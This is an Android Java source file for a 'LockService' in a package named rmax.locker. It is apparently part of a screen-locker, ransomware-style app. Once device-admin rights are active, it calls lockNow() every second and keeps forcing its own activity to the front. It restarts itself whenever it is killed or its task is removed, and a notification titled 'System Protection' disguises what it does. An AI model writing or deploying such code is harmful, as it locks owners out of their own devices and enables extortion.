package com.rmax.locker;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;

public class LockService extends Service {
    private static final String CHANNEL_ID = "RmaxLockChannel";
    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, MainActivity.AdminReceiver.class);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Protection",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
            
            Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Protection Active")
                .setContentText("Device secured by RMAX")
                .setSmallIcon(android.R.drawable.ic_lock_lock)
                .build();
            
            startForeground(1, notification);
        }
        
        // Continuous locking thread
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(1000);
                    if (dpm.isAdminActive(adminComponent)) {
                        // Keep device locked
                        dpm.lockNow();
                        
                        // Restart activity if not in foreground
                        Intent intent = new Intent(this, MainActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                                       Intent.FLAG_ACTIVITY_CLEAR_TOP |
                                       Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        startActivity(intent);
                    }
                } catch (Exception e) {}
            }
        }).start();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // Restart service when killed
        Intent restartService = new Intent(getApplicationContext(), this.getClass());
        restartService.setPackage(getPackageName());
        startService(restartService);
        super.onTaskRemoved(rootIntent);
    }
}
